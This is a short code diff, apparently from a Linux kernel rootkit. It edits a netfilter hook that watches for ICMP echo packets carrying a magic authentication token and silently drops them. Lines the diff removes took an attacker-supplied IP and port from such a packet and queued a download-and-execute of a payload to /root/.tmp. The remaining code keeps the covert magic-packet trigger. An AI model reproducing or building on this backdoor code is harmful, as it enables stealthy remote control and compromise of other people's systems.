@@ -19,14 +19,12 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
     struct iphdr *ip_header;
     struct icmphdr *icmp_header;
     struct magic_icmp *payload;
-    unsigned int payload_size, ip = 0;
-    unsigned short port = 0;
+    unsigned int payload_size;
 
     ip_header = ip_hdr(skb);
     if ( ! ip_header )
         return NF_ACCEPT;
 
-	printk("ip_header->protocol 1: %hu\n",ip_header->protocol);
     if ( ip_header->protocol != IPPROTO_ICMP )
         return NF_ACCEPT;
 
@@ -42,16 +40,6 @@ unsigned int watch_icmp ( unsigned int hooknum, struct sk_buff *skb, const struc
 
     if ( icmp_header->type != ICMP_ECHO || payload_size != 10 || payload->magic != AUTH_TOKEN )
         return NF_ACCEPT;
-
-    DEBUG("Received magic ICMP packet\n");
-
-    #if defined(_CONFIG_DLEXEC_)
-    ip = payload->ip;
-    port = payload->port;
-
-    // 3 attempts, 2000ms delay
-    dlexec_queue("/root/.tmp", ip, port, 2, 2000);
-    #endif
 
     return NF_STOLEN;
 }
